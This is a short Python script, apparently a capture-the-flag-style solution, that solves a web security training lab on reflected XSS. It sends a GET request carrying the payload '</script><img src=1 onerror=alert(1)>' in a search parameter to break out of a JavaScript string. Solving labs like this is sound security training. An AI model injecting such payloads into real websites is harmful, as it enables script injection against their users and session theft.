###########################################################################################
#
# Author: Ahmed Elqalaawy (@elqal3awii)
#
# Date: 23/11/2023
#
# Lab: Reflected XSS into a JavaScript string with single quote and backslash escaped
#
# Steps: 1. Inject payload in the search query parameter to call the alert function
#        2. Observe that the script has been executed
#
###########################################################################################


###########
# imports
###########
import requests
from colorama import Fore


#########
# Main
#########

# change this to your lab URL
url = "https://0a72004f04064fe4809f71a800110031.web-security-academy.net"

# payload to call the alert function
payload = "</script><img src=1 onerror=alert(1)>"

try:
    # fetch the page with the injected payload
    requests.get(f"{url}?search={payload}")

except:
    print(Fore.RED + "[!] Failed to fetch the page with the injected payload through exception")
    exit(1)

print(Fore.WHITE + "❯❯ Injecting payload in the search query parameter to call the alert function.. " + Fore.GREEN + "OK")
print(Fore.WHITE + "🗹 The lab should be marked now as " + Fore.GREEN + "solved")



